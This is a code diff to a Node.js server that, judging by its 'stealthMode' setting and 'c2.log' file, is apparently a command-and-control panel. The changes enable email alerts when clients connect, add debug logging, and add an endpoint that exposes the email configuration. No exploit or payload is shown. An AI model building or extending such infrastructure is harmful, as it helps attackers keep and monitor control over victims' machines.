@@ -92,7 +92,7 @@ const defaultSettings = {
   stealthMode: true,
   logFile: './logs/c2.log',
   backupInterval: 24,
-  emailEnabled: false,
+  emailEnabled: true,
   emailHost: 'smtp.gmail.com',
   emailPort: 587,
   emailSecure: false,
@@ -175,7 +175,15 @@ function createEmailTransporter() {
 
 async function sendConnectionAlert(clientInfo) {
   const settings = getAllSettings();
+  console.log('[EMAIL] Checking email settings:', {
+    enabled: settings.emailEnabled,
+    user: settings.emailUser,
+    to: settings.emailTo,
+    host: settings.emailHost
+  });
+  
   if (!settings.emailEnabled || !settings.emailTo || settings.emailTo.length === 0) {
+    console.log('[EMAIL] Email disabled or no recipients configured');
     return;
   }
 
@@ -217,10 +225,21 @@ async function sendConnectionAlert(clientInfo) {
   };
 
   try {
+    console.log('[EMAIL] Attempting to send email with options:', {
+      from: mailOptions.from,
+      to: mailOptions.to,
+      subject: mailOptions.subject
+    });
+    
     const info = await emailTransporter.sendMail(mailOptions);
     console.log(`[EMAIL] Connection alert sent successfully: ${info.messageId}`);
   } catch (error) {
     console.error('[EMAIL] Failed to send connection alert:', error);
+    console.error('[EMAIL] Error details:', {
+      code: error.code,
+      command: error.command,
+      response: error.response
+    });
   }
 }
 
@@ -888,6 +907,19 @@ app.get('/api/downloads/:filename', (req, res) => {
 });
 
 // Email configuration endpoints
+app.get('/api/email/status', (req, res) => {
+  const settings = getAllSettings();
+  res.json({
+    emailEnabled: settings.emailEnabled,
+    emailUser: settings.emailUser,
+    emailHost: settings.emailHost,
+    emailPort: settings.emailPort,
+    emailTo: settings.emailTo,
+    emailFrom: settings.emailFrom,
+    emailSubject: settings.emailSubject
+  });
+});
+
 app.get('/api/email/test', async (req, res) => {
   try {
     const settings = getAllSettings();
